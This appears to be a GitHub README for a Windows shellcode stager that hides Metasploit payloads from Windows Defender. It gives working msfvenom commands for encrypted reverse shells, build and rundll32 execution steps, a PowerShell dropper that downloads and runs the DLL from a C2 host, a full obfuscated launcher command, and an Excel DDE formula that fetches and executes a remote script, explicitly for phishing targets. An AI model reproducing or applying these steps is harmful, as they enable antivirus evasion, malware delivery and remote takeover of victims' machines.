# stager.dll/stager.exe
Code from this article: [https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/](https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/). The advantage is that you can embed well known open source payloads and still fly under the radar.  

**HOW TO:**  
If you want to use the reverse_tcp_rc4 meterpreter payload (useful to bypass NIDS),  get MSF5 from official repository (master branch - no official release yet at this time for v5): [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework).  

Then generate payload that suits your needs, ex:  
```ruby msfvenom -p windows/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST=192.168.1.24 LPORT=443 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c```  
  
********************************
***Update 02/12/2019***:  
Right now we still have the meterpreter agent connect back. However any meterpreter command executed by the agent is now triggered by Defender.  
  
A solution is to use the [new MSF payloads](https://blog.rapid7.com/2019/11/21/metasploit-shellcode-grows-up-encrypted-and-authenticated-c-shells/) which are returning a simple command line with a ChaCha20 ciphered communication:  
  
```
ruby msfvenom -p windows/x64/encrypted_shell_reverse_tcp LHOST=192.168.1.24 LPORT=443 --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c
```
********************************
  
Replace the payload in stager_dll_xx.cpp and build the DLL on a Windows machine with the following command:  
```cl /LD /MT /EHa stager_dll_xx.cpp aes.cpp /Fe:stager.dll```  
  
You can also build a standalone executable with:  
```cl /MT /EHa stager_exe_xx.cpp aes.cpp /Fe:stager.exe```  
  
*In case of troubling while compiling, check [https://stackoverflow.com/questions/42794845/visual-studio-community-2017-cl-exe](https://stackoverflow.com/questions/42794845/visual-studio-community-2017-cl-exe).*  

![https://phackt.com/public/images/stager/stager2.png](https://phackt.com/public/images/stager/stager2.png)  

*N.B: I added a dynamic analysis bypass taken from this article:* [https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf](https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf)  

Now edit meterpreter.rc and run:
```
ruby msfconsole -r <path_to_repo>/meterpreter.rc
```

Then run ```rundll32 stager.dll,Exec```  

![https://phackt.com/public/images/stager/stager1.png](https://phackt.com/public/images/stager/stager1.png)  

If you want to download your DLL from a C2 and run it, here is the powershell script i used:  
```
$file = $env:temp+'\'+(Get-Random)+'.dll'; (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.24/stager.dll',$file); $exec = New-Object -com shell.application; $exec.shellexecute('rundll32',$file+',Exec');
```

How to obfuscate it:  
```
git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
# N.B: i would recommend to flag the downloaded repo as trusted in your AV
cd Invoke-Obfuscation && powershell -exec bypass -c "Import-Module ./Invoke-Obfuscation.psd1;Invoke-Obfuscation"
```

Now in Invoke-Obfuscation:
```
SET SCRIPTPATH dropper.ps1
TOKEN\ALL\1,BACK,MEMBER\1,BACK,WHITESPACE\1,1,1,HOME,STRING\3,HOME,COMPRESS\1,Launcher\PS\234567\Copy
```

You should get something like this (here is the whole command):  
```
POWERsHeLL -NONINteRAcT -WINdoW  HidDEN -NoLO  -execUTIon bYpASS  -NOpROF  -comMAN   ". ( $eNv:CoMsPEC[4,26,25]-JOin'')( new-OBjecT io.CoMpreSSiOn.DefLAtEsTrEam( [sYStEM.iO.MEMoryStrEAM] [coNVERt]::FrOMbase64STRing('ZVNrb6JAFP0rN41ZIAgtL2s1/WAsrc2aajDpNkv8gDgWWkQD9OGy/Pedxx3K7prA3BnnnnvuOZfeT68AuIYwTqIghDWsz/LF/aokxfGJGOR18Zin8FtznXUQJXHY11zLEqFuf0VDEagA/nQyX5JiagDYVzJniJFuXWIwHGAGiSfzo18Yg/byxVCiysuWbbX48j5cSUaKm+yU9hgGzn9VHQ+DgWSstjQ1ZQwAGsgXuIquJLuYfPoUt48P7OipAcUxaGhg1c1FTWN2nW5VnQUNmd8vZ6fbeuNVfQpFs2wny7Y5QrzhWtBnZzAku246SCp7/NfF+0NqivS3GFNoDfJJcEMqDLKMJCXnJohRLKdmoAJRNZspoYQ+CWPEGI5BdElzEsSQ5Eqx0kKs2DEyswz/OaRVFKfZUVbvFHQ5f16w8Vhx2cj+EBsgepBkH3CNycsGwwWT9IMIvYUiDipCQVFeqso3EL9roTZVOv6rrzF6Rw1ImQH0DnpAi2zNosOcrceqkt1b562UGERVee7apmXi/hnX4cAy7SvcnI+4hVKDYd1cchkEe483MOi4St/ku/SVj1iy+zhIWll6u41wcyNFz/KvEkJgDi581aCdVqZwTtJsKmU2/+l2345LeVrxiMtNXxvyw6w6bnqyjFuLyeQNqLxOx8DNgnkm4oq6KRAYwAWOAzonWmeGSQPxaNzSZ8pvJWNmAbveAWsl1NsUTKP39oet7PVO8pFTHQVGpzOn7nLjI4S+fDFjnzFbdYG/uWNW4EGz3C/p/7OTX9Fl9P5Ap6z9qK75t+9n9Czl376iqnDGmgwnRTA5rUejwH/0i5KovV9eocHYVKG3Ssg8S7ehtdZ75YzFN6HlrHXlSdFUCFdVkObPNPXlkOYqKAr0RbL2Bw==' ), [iO.cOmPrEsSion.cOmPrESsionModE]::dEcOmprESs ) |fOREACH{ new-OBjecT  SySTem.IO.sTREAMrEadEr($_, [tExT.ENCodIng]::AscII )} | foreaCh {$_.ReadTOENd()}) "
```  

Now let's keep the obfuscated payload and upload it as .ps1 to VirusTotal:  

![https://phackt.com/public/images/stager/stager3.png](https://phackt.com/public/images/stager/stager3.png)  

Now can we phish someone with a FUD MS Office dropper?. This one is pretty tough, some recon/SE should be done to know at least what kind of AV exists on the machine.  However it's interesting to see that the Dynamic Data Exchange mechanism still flies under the radar of Windows Defender and other well know AVs without any specific obfuscation (no QUOTE or else) with a ration detection of **4/59** on VT.  

For my purpose i finally used the following cell formula (taken from [https://blog.hyperiongray.com/excel-dde-exploitation-and-ml-av-bypass/](https://blog.hyperiongray.com/excel-dde-exploitation-and-ml-av-bypass/)):  
```
=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c powershell.exe -nop -w 1 $e=(New-Object System.Net.WebClient).DownloadString(\"http://192.168.1.24/powershell_dropper_obf.ps1\"); IEX $e'!'A1'
```

Cheers,